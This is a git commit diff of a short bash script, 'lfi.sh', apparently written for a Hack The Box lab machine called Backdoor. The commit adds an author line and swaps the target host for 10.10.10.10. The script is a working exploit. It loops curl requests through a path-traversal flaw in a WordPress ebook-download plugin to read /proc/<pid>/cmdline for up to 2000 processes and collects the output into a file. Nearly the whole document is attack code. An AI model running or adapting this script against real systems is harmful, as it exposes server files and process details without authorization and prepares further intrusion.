e507c7ed3f75f380f269306e09ed7eb193017a9a
Mardcore7 <83950727+Mardcore7@users.noreply.github.com>
2023-01-08 11:04:16 +0100

    Update lfi.sh

--- lfi.sh
+++ lfi.sh
@@ -1,7 +1,8 @@
 #!/bin/bash
+# Author: Mardcore
 
 for i in $(seq 1 2000);
-  do curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl=../../../../../../../../../proc/$i/cmdline | sed 's/cmdline/\n/g' | tail -n +4 | sed 's/<script>/\n/g' | head -n -1 >> proc;
+  do curl http://10.10.10.10/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl=../../../../../../../../../proc/$i/cmdline | sed 's/cmdline/\n/g' | tail -n +4 | sed 's/<script>/\n/g' | head -n -1 >> proc;
 done
 
 cat proc | sed '/^ *$/d' > process
